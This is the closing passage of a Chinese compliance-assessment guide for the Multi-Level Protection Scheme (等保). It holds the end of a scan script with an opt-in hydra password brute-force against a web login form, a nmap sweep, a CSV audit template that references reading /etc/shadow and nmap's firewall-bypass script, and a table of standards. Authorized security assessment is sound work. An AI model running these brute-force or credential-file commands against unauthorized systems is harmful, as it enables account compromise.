            -P /usr/share/wordlists/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt \
            "${TARGET_WEB_IP:-${TARGET_WEB_URL}}" http-post-form \
            "/login:user=^USER^&pass=^PASS^:F=error" 2>/dev/null || true
    fi
else
    log_info "阶段4: 渗透测试（已跳过，设置 ENABLE_PENTEST=true 启用）"
fi

# =============================================
# 阶段5: 等保三级 - 安全管理中心
# =============================================
if [ "$LEVEL" -ge 3 ] && [ -n "${MANAGER_NETWORK:-}" ]; then
    log_info "阶段5: 安全管理中心检测（等保${LEVEL}级要求）"
    nmap -sn "${MANAGER_NETWORK}" -oA "${REPORT_BASE}/02_baseline_check/11_manager_network" 2>/dev/null || true
fi

# =============================================
# 汇总报告
# =============================================
log_info "========================================="
log_info "扫描完成，生成汇总..."
log_info "========================================="

# 汇总高危发现
echo "=== 高危发现汇总 ===" > "${REPORT_BASE}/findings_summary.txt"
grep -rn 'VULNERABLE\|Critical\|High\|高危\|严重\|CVE-' \
    "${REPORT_BASE}/" --include="*.txt" --include="*.nmap" 2>/dev/null \
    >> "${REPORT_BASE}/findings_summary.txt" || echo "  未发现明显高危项" >> "${REPORT_BASE}/findings_summary.txt"

cat <<EOF
=========================================
  等保${LEVEL}级测评自动化扫描完成
=========================================
  报告目录: ${REPORT_BASE}
  ├── 01_asset_discovery/   # 资产发现
  ├── 02_baseline_check/    # 基线检查
  ├── 03_vulnerability_scan/ # 漏洞扫描
  ├── 04_pentest/           # 渗透测试
  └── 05_logs/              # 执行日志

  → 汇总文件: ${REPORT_BASE}/findings_summary.txt
=========================================
  下一步:
  1. 执行各安全域"访谈"环节
  2. 远程登录目标主机执行"核查"命令（见本技能2.4节）
  3. 将访谈/核查结果填入测评记录表
  4. 使用 report_collector.sh 生成最终报告
=========================================
EOF
```

---

## 附录C：测评记录模板（CSV）

```csv
安全域,控制点,测评指标编号,指标描述,测评方法,测评结果(符合/部分符合/不符合),问题描述,关联工具命令,截图编号
安全计算环境,身份鉴别,a),操作系统是否存在空口令账户,核查+测试,,,awk -F: ... /etc/shadow,
安全计算环境,身份鉴别,b),是否配置密码复杂度策略,核查+测试,,,cat /etc/pam.d/common-password,
安全计算环境,身份鉴别,c),是否配置登录失败锁定策略,核查+测试,,,grep pam_tally2 /etc/pam.d/,
安全计算环境,身份鉴别,d),远程管理是否加密,核查+测试,,,nmap --script ssl-enum-ciphers,
安全计算环境,访问控制,a),是否限制默认账户访问,核查,,,cat /etc/passwd | grep -E,
安全区域边界,访问控制,a),边界设备访问控制策略是否默认拒绝,访谈+核查+测试,,,nmap --script firewall-bypass,
安全通信网络,通信传输,a),通信传输是否加密,核查+测试,,,,testssl.sh,
安全管理中心,集中管控,a),是否部署集中安全管理平台,访谈+核查,,,,nmap -p 443 管理网段,
```

---

## 附录D：法律法规依据

| 法规/标准 | 编号 | 用途 |
|-----------|------|------|
| 网络安全法 | 中华人民共和国主席令 | 等保法律依据 |
| 信息安全等级保护管理办法 | 公通字[2007]43号 | 等保制度依据 |
| 等保基本要求 | GB/T 22239-2019 | 安全技术要求基线 |
| 等保测评要求 | GB/T 28448-2019 | 测评方法和判定 |
| 等保安全设计技术要求 | GB/T 25070-2019 | 新系统建设参考 |
| 等保实施指南 | GB/T 25058-2019 | 全流程实施指引 |
| 商用密码应用安全性评估 | GM/T 0054-2018 | 密码应用合规性 |

---

## 使用说明

1. **环境**: Kali Linux，确保工具已安装（nmap/masscan/sqlmap/hydra/testssl/nikto/nuclei等）
2. **授权**: 必须取得客户书面授权书，明确测评范围和允许的操作
3. **流程**: 严格按六阶段执行——定级确认→差距分析→现场测评→整改建议→复测→报告
4. **等级区分**: 二级侧重网络+计算环境+区域边界；三级在此基础上增加安全管理中心
5. **三种方法**: 每项指标必须通过"访谈+核查+测试"三维交叉验证
6. **记录留痕**: 所有测试操作截图、命令输出均需存档作为测评证据
